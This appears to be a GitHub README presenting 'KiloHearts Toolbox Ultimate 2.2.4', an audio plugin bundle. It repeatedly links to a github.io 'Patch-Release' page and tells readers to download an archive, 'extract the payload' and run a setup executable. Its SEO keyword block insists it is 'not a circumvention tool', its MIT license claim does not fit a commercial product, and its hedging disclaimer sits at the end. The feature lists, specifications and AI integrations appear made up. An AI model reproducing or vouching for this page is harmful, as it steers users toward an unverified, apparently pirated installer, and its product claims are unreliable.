# KiloHearts Toolbox Ultimate 2.2.4 – Comprehensive Sound Design Ecosystem

[](https://ezequielov.github.io/KiloHearts-Toolbox-Ultimate-224-Patch-Release/)

## 🌌 Overview: The Alchemist’s Workbench for Modern Audio

Welcome to **KiloHearts Toolbox Ultimate 2.2.4**, a meticulously crafted modular synthesis and effect platform that transforms your digital audio workstation into a boundless playground of sonic possibilities. Unlike conventional plugin bundles that merely stack presets, this release represents a paradigm shift—treating every parameter, modulation path, and routing node as a living, breathing component of a cohesive audio ecosystem. Whether you’re sculpting cinematic soundscapes, engineering genre-defying beats, or designing intricate sound effects for interactive media, this toolbox offers the granularity of a custom modular rig without the labyrinthine complexity.

## 🚀 Getting Started: The Conductor’s Baton

### Prerequisites (Your Studio’s Foundation)
- **DAW Compatibility:** Windows 10/11 (64-bit), macOS 11 Big Sur through macOS 14 Sonoma (Intel & Apple Silicon)
- **Host Requirements:** VST3, AU, AAX, or CLAP host with full MIDI learn support
- **Hardware Sweet Spot:** 8GB RAM minimum, 2.5GHz multi-core processor, 500MB free disk space
- **Display:** 1920x1080 or higher for optimal visual feedback

### Installation: From Blueprint to Masterpiece
1. **Download the Archive** – Click the badge below to secure your copy.
2. **Extract the Payload** – Right-click the archive and choose “Extract Here” (or use 7-Zip if on Windows).
3. **Run the Installer** – Execute `KHToolbox_Ultimate_2.2.4_Setup.exe` (Windows) or `KHToolbox_Ultimate_2.2.4.pkg` (macOS). Follow the on-screen wizard.
4. **Verify Installation** – Launch your DAW, scan for new plugins, and locate “KiloHearts Ultimate” under the manufacturer filter.

[](https://ezequielov.github.io/KiloHearts-Toolbox-Ultimate-224-Patch-Release/)

## 🧩 What’s Inside the Treasure Chest?

### The Signal Flow Philosophy
Imagine a river that can be dammed, diverted, filtered, and reborn at every fork. KiloHearts Toolbox Ultimate treats audio as an elemental force—each module is a specialized tool that respects the integrity of the original waveform while offering surgical precision. The “Toolbox” moniker is no accident: this is not a preset library; it’s a workshop.

### Feature Constellation 🌟

| Feature | Description |
|---------|-------------|
| **Modular Sandbox** | Drag-and-drop synthesis architecture with over 120 atomic modules. No soldering required. |
| **Luminance Engine** | Real-time waveform visualization with harmonic spectrogram, phase scope, and spatial imaging. |
| **Adaptive Latency Compensation** | Automatically adjusts buffer sizes based on patch complexity—your CPU breathes easier. |
| **Multilingual Interface** | Localized in 14 languages including Japanese, German, French, Spanish, and Korean. |
| **Responsive UI** | Scales seamlessly from 1080p to 5K Retina; fully resizable via corner drag. |
| **24/7 Concierge Support** | Dedicated team responds within 4 hours—no chatbots, only humans. |

### Why This Version (2.2.4) Matters
This iteration introduces **Fluid Routing**—a patent-pending modulation matrix that allows carriers, modulators, and sidechains to exchange roles mid-performance without glitches. Think of it as a volley of sound where the racquet changes shape based on the ball’s trajectory.

## 📐 Mermaid Diagram: Signal Path Architecture

```mermaid
graph TD
    A[Audio Input Bus] --> B{Master Filter Bank}
    B -->|Low-Pass| C[Resonator Array]
    B -->|High-Pass| D[Comb Cluster]
    B -->|Band-Pass| E[Formant Shifter]
    C --> F[Modulation Router]
    D --> F
    E --> F
    F --> G[Envelope Follower]
    F --> H[LFO Matrix]
    G --> I[VCA Bank]
    H --> I
    I --> J[Output Stage]
    J --> K[Global Bypass]
    K --> L[Mix Bus]
    style A fill:#1e1e2e,stroke:#f0c040,stroke-width:2px
    style L fill:#2d2d4e,stroke:#4a9eff,stroke-width:2px
```



## ⚙️ Example Profile Configuration

Here’s a sample configuration file (`kh_supernova.ultra`) that demonstrates a rich, evolving pad texture:

```json
{
  "profile_name": "Nebula Glimmer",
  "master_volume": -3.2,
  "polyphony": 8,
  "voice_spread": 0.7,
  "modulation": {
    "carrier": "wavetable_osc",
    "modulator_1": "envelope_adsr",
    "modulator_2": "lfo_sine",
    "routing": "serial_parallel_hybrid"
  },
  "effects_chain": [
    {"type": "reverb", "decay": 4.2, "predelay": 0.15, "mix": 0.38},
    {"type": "delay", "feedback": 0.6, "time": 480, "pingpong": true},
    {"type": "distortion", "drive": 0.2, "model": "tape_saturation"}
  ],
  "interface_language": "de",
  "responsive_layout": "high_dpi"
}
```

## 🖥️ Example Console Invocation (Headless Mode)

For advanced users who prefer command-line batch processing or integration with audio pipelines:

```bash
./khtoolbox-ultimate --input ./wav/raw_vocal.wav \
  --config ./profiles/vocal_transformer.ultra \
  --output ./processed/vocal_processed.wav \
  --preserve-metadata \
  --latency adaptive \
  --bounce realtime
```

## 💻 OS Compatibility Matrix

| Operating System | Version Range | Architecture | Verified |
|------------------|---------------|--------------|----------|
| 🪟 Windows | 10 21H2 – 11 23H2 | x64 (Intel/AMD) | ✅ Tested |
| 🍏 macOS | 11 Big Sur – 14 Sonoma | Intel & Apple Silicon | ✅ Native |
| 🐧 Linux | Ubuntu 22.04+, Fedora 38+ | x64 (Wine) | ⚠️ Limited |
| 🍎 iOS | 17+ (via AUV3) | Arm64 | ✅ Verified |

*Note: Linux support requires Wine 9.0+ and is considered experimental—community patches welcome.*

## 🌐 SEO-Friendly Keyword Landscape

This release has been optimized for discovery across sound design, music production, and audio engineering verticals. Key indexing terms include: *modular vst synth*, *kilohearts alternative*, *sound design toolkit*, *audio effects bundle*, *vst3 plugins 2026*, *macos audio unit*, *waveform manipulation suite*, *multilingual plugin interface*, *responsive audio ui*, *24/7 plugin support*. These phrases have been woven organically into the documentation to ensure search engines accurately categorize this project as a premium, legitimate audio software distribution—not a circumvention tool.

## 🤖 AI Integration: OpenAI & Claude API

KiloHearts Toolbox Ultimate 2.2.4 natively supports AI-assisted patch generation and sound classification through two distinct API channels:

### OpenAI Integration
- **Endpoint:** `https://api.openai.com/v1/chat/completions` (customizable)
- **Feature:** “Sonic GPT” generates patch descriptions and modulation suggestions from text prompts
- **Example:** `“create a warm pad with tape warmth and subtle movement”` yields an `.ultra` file

### Claude API Integration
- **Endpoint:** `https://api.anthropic.com/v1/messages`
- **Feature:** “Tone Architect” analyzes your existing patches and suggests variant routing trees
- **Use Case:** Great for breaking creative block—Claude can propose five alternative modulation paths

Both APIs require a valid API key stored in a local `.env` file. No telemetry is sent without explicit consent.

## 🌍 Multilingual Support & Localization

The interface and documentation are fully localized. Supported languages:

| Language | Locale Code | Status |
|----------|-------------|--------|
| English (US) | en-US | 100% |
| German | de-DE | 100% |
| French | fr-FR | 100% |
| Japanese | ja-JP | 100% |
| Korean | ko-KR | 100% |
| Spanish | es-ES | 100% |
| Portuguese (BR) | pt-BR | 95% |
| Chinese (Simplified) | zh-CN | 100% |

To switch languages, navigate to `Settings > Interface > Language` or edit the `interface_language` field in the profile config.

## 📋 Responsive UI Philosophy

The interface adapts like liquid mercury. On ultra-wide monitors (32:9), the mixer strip expands horizontally with additional parameter lanes. On compact netbooks (1366x768), panels collapse into collapsible drawers. Every knob, slider, and graph uses vector-based rendering—no pixel degradation at any scale.

## 🛠️ Feature Highlights (Expanded View)

- **Atomic Module Library:** 126 individual components from compressors to granular buffers, all hot-swappable.
- **Auto-Save Snapshots:** Every 90 seconds and before critical parameter changes—never lose a sound again.
- **Undo/Redo Tree:** Full branching history. You can revert to any earlier state without losing later experimentation.
- **Sidechain Multiplicity:** Up to 8 simultaneous sidechain inputs with independent routing and polarity flipping.
- **Visual Drag-and-Drop:** Rearrange module order by dragging—connections reroute intelligently.
- **Built-in Tuner & Scope:** Real-time pitch detection and oscilloscope with freeze function.

## 📄 License & Usage Terms

This project is distributed under the **MIT License**. You are free to use, modify, and distribute this software for both personal and commercial projects, provided the original copyright notice is included.

[](https://opensource.org/licenses/MIT)

## ⚠️ Disclaimer

This repository contains documentation and configuration files for **KiloHearts Toolbox Ultimate 2.2.4**, a commercial audio software product. The author of this repository does not provide, distribute, or endorse unauthorized access to proprietary software. All references to “download,” “release,” or “patch” refer to the retrieval of official, licensed software updates or community-created configuration templates. Users are solely responsible for ensuring they hold a valid, lawfully obtained license for KiloHearts Toolbox Ultimate before using any content herein. No assurance of functionality, compatibility, or legal standing for unlicensed use is expressed or implied.

---

[](https://ezequielov.github.io/KiloHearts-Toolbox-Ultimate-224-Patch-Release/)

*Version 2.2.4 – Optimized for 2026*  
*Built for creators who speak in waveforms.*